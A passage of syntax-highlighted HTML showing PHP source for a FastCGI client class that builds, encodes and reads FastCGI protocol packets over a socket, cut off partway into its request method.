number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_REQS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token string single-quoted-string">'MPXS_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Socket     * @var Resource     */</span>    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Host     * @var String     */</span>    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Port     * @var Integer     */</span>    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Keep Alive     * @var Boolean     */</span>    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Constructor     *     * @param String $host Host of the FastCGI application     * @param Integer $port Port of the FastCGI application     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Define whether or not the FastCGI application should keep the connection     * alive at the end of a request     *     * @param Boolean $b true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get the keep alive status     *     * @return Boolean true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Create a connection to the FastCGI application     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build a FastCGI packet     *     * @param Integer $type Type of the packet     * @param String $content Content of the packet     * @param Integer $requestId RequestId     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>            <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build an FastCGI Name value pair     *     * @param String $name Name     * @param String $value Value     * @return String FastCGI Name value pair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">/* nameData &amp; valueData */</span>        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a set of FastCGI Name value pairs     *     * @param String $data Data containing the set of FastCGI NVPair     * @return array of NVPair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Decode a FastCGI Packet     *     * @param String $data String containing all the packet     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a FastCGI Packet     *     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$len</span> <span class="token operator">-=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get Informations on the FastCGI application     *     * @param array $requestedInfo information to retrieve     * @return array     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValues</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Execute a request to the FastCGI application     *     * @param array $params Array of parameters     * @param String $stdin Content     * @return String     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span 